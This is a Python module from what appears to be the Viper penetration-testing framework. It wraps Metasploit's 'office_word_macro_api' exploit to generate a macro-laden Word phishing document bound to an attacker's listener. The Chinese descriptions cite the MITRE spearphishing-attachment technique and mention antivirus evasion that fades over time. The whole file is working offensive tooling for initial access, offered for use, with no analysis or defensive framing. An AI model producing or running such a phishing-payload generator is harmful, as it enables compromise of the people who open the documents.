# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "Office宏钓鱼文档"
    DESC = "模块生成绑定指定监听的宏Payload,并将payload注入到样例word文档中.\n" \
           "宏钓鱼文档的随着时间的推移免杀效果会大幅下降,建议及时更新到最新版本."
    REQUIRE_SESSION = False
    MODULETYPE = TAG2CH.Initial_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1193"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1193/"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "exploit"
        self.mname = "multi/fileformat/office_word_macro_api"

    def check(self):
        """执行前的检查函数"""
        result = self.set_payload_by_handler()
        if result is not True:
            return False, "无法解析Handler,请选择正确的监听"
        if 'windows' not in self.opts.get('PAYLOAD').lower():
            return False, "选择handler错误,建议选择windows平台的handler"
        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_good("模块执行成功")
            self.log_good("生成文档名称: {}".format(data.get("docm")))
            self.log_good("请在 <文件列表> 中下载此文档")
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
